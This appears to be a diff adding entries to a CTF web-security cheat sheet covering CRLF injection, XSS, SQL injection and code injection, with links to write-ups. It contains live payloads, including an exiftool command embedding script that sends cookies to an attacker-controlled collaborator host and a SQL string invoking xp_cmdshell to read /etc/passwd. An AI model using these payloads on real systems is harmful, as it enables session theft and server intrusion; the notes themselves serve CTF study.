@@ -2,6 +2,8 @@
 
 ./javascript.md
 
+https://github.com/swisskyrepo/PayloadsAllTheThings
+
 https://portswigger-labs.net/hackability/inspector/index.php?input=window
 [HTML Codes \- Table of ascii characters and symbols](https://ascii.cl/htmlcodes.htm)
 [Unicode/UTF\-8\-character table](https://utf8-chartable.de/unicode-utf8-table.pl)
@@ -72,6 +74,9 @@ RegExp.prototype.test = new Proxy(RegExp.prototype.test, {
 - Request URL with CRLF + Headers
     - http://109.233.61.11:27280/?retpath=/news/%0d%0aX-Accel-Redirect:%20/secret/flag
         - https://www.tasteless.eu/post/2014/02/olympic-ctf-sochi-2014-xnginx-writeup/
+- Client information disclosure
+    - Using webhook.site: `user-agent curl/7.19.3` => vulnerable version
+        - https://github.com/joshibeast/cft-writeups/blob/master/balccon2020/let_mee_see.txt
 - https://book.hacktricks.xyz/pentesting-web/ssrf-server-side-request-forgery
 
 ### Reverse DNS checks
@@ -204,6 +209,11 @@ Polyglots:
 - [CONFidence CTF 2019\-Web 50分析思考 &\#8211; 郁离歌丶的博客](http://yulige.top/?p=665)
     - [SVG XSS的一个黑魔法 · Tuuu Nya&\#39;s Blog](https://www.hackersb.cn/hacker/85.html)
 
+```bash
+exiftool -make "<script>document.location='http://burpcollaboratoridoryourserver?c='+document.cookie</script>" imagefinal.jpg
+```
+    - https://github.com/joshibeast/cft-writeups/blob/master/balccon2020/web-Imgr.txt
+
 # SQL Injection (SQLI)
 
 ```sql
@@ -215,6 +225,9 @@ Polyglots:
 
 -- %" UNION SELECT "one", "two"; --%";
 -- %" AND username in (SELECT username FROM sqlite_master where username like "%") --
+
+-- WAF detection
+-- 9495 AND 1=1 UNION ALL SELECT 1,NULL,'<script>alert("XSS")</script>',table_name FROM information_schema.tables WHERE 2>1--/**/; EXEC xp_cmdshell('cat ../../../etc/passwd')#
 ```
 
 ```bash
@@ -258,6 +271,17 @@ for i in xrange(1, 50):
     - https://www.40huo.cn/blog/0ctf-2017-writeup.html
 
 - https://medium.com/@gregIT/ringzer0team-ctf-sqli-challenges-part-2-b816ef9424cc
+
+# code injection
+
+On: state persisted as objects (e.g. cookie)
+
+```
+j:[{"id":1,"body":__FILE__}]
+j:[{"id":1,"body":["foo'"]}]
+```
+    - https://github.com/saw-your-packet/ctfs/blob/master/DarkCTF/Write-ups.md#dusty-notes
+        - https://artsploit.blogspot.com/2016/08/pprce2.html
 
 # deserialization
 
